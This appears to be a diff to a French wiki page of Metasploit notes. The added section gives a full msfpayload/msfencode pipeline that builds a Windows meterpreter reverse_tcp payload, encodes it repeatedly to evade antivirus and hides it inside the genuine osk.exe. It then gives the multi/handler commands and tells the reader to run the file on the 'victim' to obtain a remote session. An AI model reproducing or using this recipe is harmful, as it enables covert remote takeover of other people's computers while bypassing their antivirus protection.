@@ -12,8 +12,29 @@ It include :
 
 ====== Metasploit ======
 
-==== Glossary ====
-{{:msf_1.png?200|}}
+Quelques astuces sous metasploit :
+
+Créer un payload exécutable qui ne sera pas facilement détecté par les antivirus (Fonctionne sous Windows 2000/XP)
+<code>
+./msfpayload windows/meterpreter/reverse_tcp \ 
+LHOST=xxx.xxx.xxx.xxx LPORT=80 R | \ 
+./msfencode -e x86/shikata_ga_nai -c 5 -t raw | \ 
+./msfencode -e x86/call4_dword_xor -c 2 -t raw | \ 
+./msfencode -e x86/shikata_ga_nai -c 5 -t raw | \ 
+./msfencode -e x86/jmp_call_additive -c 2 -t raw | \ 
+./msfencode -e x86/shikata_ga_nai -c 5 -t raw | \ 
+./msfencode -x osk.exe -e x86/alpha_mixed -c 2 -t exe -o reverse_tcp.exe 
+</code>
+
+Ceci encode et dissimule un meterpreter remote_tcp exploit pour windows 32bit dans un fichier authentique de windows (osk.exe gestionnaire de clavier virtuel). Vous trouverez le fichier osk.exe sous Windows 2000 dans le répertoire c:\WINDOWS\system32\osk.exe
+
+Lancez ensuite la console metasploit msfconsole > use exploit/multi/handler 
+<code>
+> set RHOST xxx.xxx.xxx.xxx ( ou xxx.xxx.xxx.xxx est l'ip sur la quelle le meterpreter se connectera) 
+> set RPORT 80 
+> exploit
+</code> 
+Uploadez le meterpreter et lancez le sur la victime. Si tout se passe bien le meterpreter se connecte au handler et vous obtenez une session console sur la victime.
 
 ==== Distcc exploit ====
 
@@ -73,8 +94,4 @@ Args :
 
 
 
-===== DistCC + udev =====
 
-
-====== Sources ======
-http://www.lestutosdenico.com/outils/burp-suite
